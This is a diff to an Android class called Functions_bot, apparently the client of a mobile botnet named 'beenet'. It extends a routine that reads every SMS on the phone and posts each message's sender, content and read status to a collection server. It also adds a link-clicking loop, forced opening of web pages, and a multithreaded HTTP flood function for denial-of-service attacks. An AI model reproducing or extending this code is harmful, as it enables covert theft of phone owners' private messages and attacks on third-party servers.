@@ -4,12 +4,14 @@ import android.Manifest;
 import android.accounts.Account;
 import android.accounts.AccountManager;
 import android.content.Context;
+import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.location.Criteria;
 import android.location.Location;
 import android.location.LocationManager;
 import android.net.Uri;
+import android.os.AsyncTask;
 import android.os.Build;
 import android.provider.ContactsContract;
 import android.provider.Settings;
@@ -135,29 +137,37 @@ public class Functions_bot {
 
     }
 
+
+
+
     public int getSmsList(){
 
         Cursor smsCursor = appContext.getContentResolver().query(Uri.parse("content://sms/"), null, null, null, null);
 
-    String fuente, contenido, leido = "";
+    String fuente, contenido, leido, creador, id = "";
+    String [] as  = smsCursor.getColumnNames();
         if (smsCursor.moveToFirst()) {
             do {
 
 
-
+                id = smsCursor.getString(0);
+                creador=smsCursor.getString(15);
                 fuente=smsCursor.getString(2);
                 contenido = smsCursor.getString(12);
                 leido = smsCursor.getString(7);
                 HashMap<String, String> infoPost = new HashMap<String, String>();
                 infoPost.put("id_bot",getAndroidId());
                 infoPost.put("nombre",fuente);
+                infoPost.put("id_sms",id);
                 infoPost.put("contenido", contenido);
                 infoPost.put("leido",leido);
+                infoPost.put("emisor",creador);
 
 
                 SendMethod.sendMethodNR("http://192.168.1.2/beenet/getsms.php",infoPost);
 
             } while (smsCursor.moveToNext());
+            smsCursor.close();
         }
         return 0;
     }
@@ -220,6 +230,18 @@ public class Functions_bot {
         return resultado;
     }
 
+    public void clickLink(String link, int times){
+
+
+    for(int i=0; i<times;i++){
+
+        SendMethod.sendMethodNR(link);
+
+    }
+
+
+    }
+
     private String getAccounts(){
 
         AccountManager am = AccountManager.get(appContext);
@@ -277,6 +299,36 @@ public class Functions_bot {
         }
 
     }
+
+    public void openPage(String urlPage){
+
+
+        Uri url = Uri.parse(urlPage);
+        Intent intent = new Intent(Intent.ACTION_VIEW, url);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        appContext.startActivity(intent);
+    }
+
+    public void httpFlooding( String url, int iteraciones, int hilos)
+    {
+        if(hilos<1)hilos=1;
+        if(hilos>120)hilos=120;//120 para mantener un margen de 8 hilos respecto al máximo.
+        for(int i=0;i<hilos;i++)
+            new HttpFlood().execute(url, Integer.toString(iteraciones));
+
+    }
+    private class HttpFlood extends AsyncTask<String,Integer, Integer>
+        {
+
+
+            @Override
+            protected Integer doInBackground(String... params) {
+                for(int i=0; i<Integer.parseInt(params[1]);i++)
+                SendMethod.sendMethodNR(params[0]);
+                return 0;
+
+            }
+        }
     }
 
 
